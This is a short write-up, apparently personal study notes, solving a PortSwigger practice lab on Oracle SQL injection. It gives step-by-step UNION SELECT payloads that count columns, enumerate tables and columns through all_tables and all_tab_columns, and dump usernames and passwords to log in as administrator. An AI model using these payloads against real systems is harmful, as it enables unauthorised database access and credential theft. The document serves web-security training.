https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle

Lab objective: `Log in as the 'administrator' user.`

# Lab: SQL injection attack, listing the database contents on Oracle

We know that this lab contains a SQL injection vulnerability in the product category filter

After clicking Gifts category we need to find `Tabale name, column number, column name, column type and vulnerable column`

1.  We find 2 column and query is`category=Gifts' ORDER BY 2--`
2.  We find columns are vulnerable and string type and query is `category=-Gifts' UNION SELECT 'A','B' FROM dual--`
3. Now we find table name by this query `category=-Gifts' UNION SELECT table_name, NULL FROM all_tables--` table name is `USERS_PZJWZP` (Table name is different for every-time).
4. Now we will find column name so the query will `category=-Gifts' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS_PZJWZP'--` from this we find 3 columns `EMAIL, PASSWORD_AGAINY, USERNAME_JBQHIM`
5. Now we will find username and password so the query will `category=-Gifts' UNION SELECT USERNAME_JBQHIM, PASSWORD_AGAINY FROM USERS_PZJWZP--`

![[Sqli Lab 6.png|1000]]
